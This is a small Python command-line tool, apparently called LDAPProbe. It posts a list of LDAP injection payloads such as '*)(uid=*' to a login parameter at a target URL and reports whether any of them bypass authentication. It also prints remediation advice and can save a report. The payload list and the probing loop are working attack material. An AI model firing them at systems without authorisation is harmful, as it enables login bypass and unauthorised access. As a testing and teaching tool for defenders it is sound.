import requests
import argparse

PAYLOADS = [
    "*",
    "admin*",
    "*)(uid=*",
    "*) (| (uid=*",
    "admin)(uid=*"
]

def test_target(url, param, output):
    print(f"[+] Testing Target: {url}")
    print(f"[+] Parameter: {param}")
    print("-" * 50)
    vulnerable = False
    results = []

    for payload in PAYLOADS:
        try:
            data = {param: payload}
            r = requests.post(url, data=data, timeout=5)
            text = r.text.lower()
            if "admin" in text and "muneeb" in text:
                print(f"[VULNERABLE] Payload: {payload} -> Bypassed!")
                results.append(f"[VULNERABLE] {payload}")
                vulnerable = True
            else:
                print(f"[SAFE] Payload: {payload} -> Blocked")
                results.append(f"[SAFE] {payload}")
        except Exception as e:
            print(f"[ERROR] {e}")

    print("-" * 50)
    if vulnerable:
        verdict = "FINAL VERDICT: VULNERABLE"
        fix = "Remediation: Escape LDAP special characters * ( ) \\ and use parameterized LDAP queries."
    else:
        verdict = "FINAL VERDICT: CLEAN"
        fix = "Remediation: No action needed. Input filtering is working."

    print(verdict)
    print(fix)

    if output:
        with open(output, "w") as f:
            f.write(f"Target: {url}\n")
            for line in results:
                f.write(line + "\n")
            f.write(verdict + "\n")
            f.write(fix + "\n")
        print(f"[+] Report saved to {output}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LDAPProbe - LDAP Injection Tester")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", default="username", help="Parameter name")
    parser.add_argument("--method", default="POST", help="HTTP Method")
    parser.add_argument("--output", help="Output report file")
    args = parser.parse_args()
    test_target(args.url, args.param, args.output)
